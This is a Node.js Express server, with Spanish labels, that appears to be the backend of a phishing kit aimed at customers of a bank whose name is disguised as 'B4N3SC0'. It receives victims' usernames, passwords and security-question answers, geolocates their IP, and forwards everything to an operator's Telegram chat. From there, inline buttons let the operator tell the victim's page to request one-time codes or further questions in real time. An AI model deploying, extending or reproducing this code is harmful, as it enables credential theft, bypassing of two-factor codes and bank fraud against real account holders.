const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}
function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  clientes[txid] = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null
  };
  guardarEstado();

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const {
    usar,
    clavv,
    txid,
    pregunta1,
    pregunta2,
    respuesta1,
    respuesta2
  } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❓🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

${pregunta1}❓ : ${respuesta1}
${pregunta2}❓ : ${respuesta2}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  // Manejo de callback
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];
    const cliente = clientes[txid];

    if (!cliente) return res.sendStatus(404);

    cliente.status = accion;
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  // Manejo de mensaje tipo: /txid pregunta1&pregunta2
  if (req.body.message && req.body.message.text?.startsWith("/")) {
    const message = req.body.message;
    const chatId = message.chat.id;
    const text = message.text.trim();

    const match = text.match(/^\/([a-zA-Z0-9]+)\s+(.+)$/);
    if (!match) return res.sendStatus(200);

    const txid = match[1];
    const contenido = match[2];
    const cliente = clientes[txid];

    if (!cliente) {
      await enviarMensaje(chatId, `⚠️ No se encontró un cliente con ID ${txid}`);
      return res.sendStatus(200);
    }

    const [preg1, preg2] = contenido.split("&").map(p => p.trim());
    if (!preg1 || !preg2) {
      await enviarMensaje(chatId, `⚠️ Debes enviar 2 preguntas separadas por "&"`);
      return res.sendStatus(200);
    }

    cliente.preguntas = [preg1, preg2];
    cliente.status = 'preguntas';
    cliente.esperando = null;
    guardarEstado();

    await enviarMensaje(chatId, `✅ Preguntas guardadas para ${txid}\n1️⃣ ${preg1}\n2️⃣ ${preg2}`);
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

function enviarMensaje(chat_id, text) {
  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, text })
  });
}

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
